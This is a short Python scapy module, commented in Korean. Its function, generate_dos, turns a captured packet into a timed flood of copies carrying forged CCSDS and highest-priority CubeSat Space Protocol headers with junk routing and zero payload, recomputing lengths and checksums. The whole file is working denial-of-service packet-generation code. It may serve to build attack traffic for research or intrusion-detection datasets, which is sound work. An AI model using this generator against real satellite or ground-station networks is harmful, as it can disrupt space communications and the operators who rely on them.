from scapy.all import Raw, UDP, IP
from .csp import CSP  # 같은 폴더 내 모듈 임포트

def generate_dos(original_pkt, base_time, ccsds_header, multiplier):
    attack_packets = []
    # 최고 우선순위(0), 무의미한 라우팅 정보
    attack_csp = CSP(priority=0, source=9, destination=1, dst_port=0, src_port=0)
    attack_data = b"\x00\x00\x00\x00\x00\x00\x00\x00" 
    new_payload = ccsds_header + bytes(attack_csp) + attack_data

    for i in range(multiplier):
        attack_pkt = original_pkt.copy()
        attack_pkt.time = base_time + (i * 0.001)
        attack_pkt[UDP].payload = Raw(load=new_payload)
        
        del attack_pkt[UDP].len
        del attack_pkt[UDP].chksum
        if attack_pkt.haslayer(IP):
            del attack_pkt[IP].len
            del attack_pkt[IP].chksum
            
        attack_packets.append(attack_pkt)
        
    return attack_packets
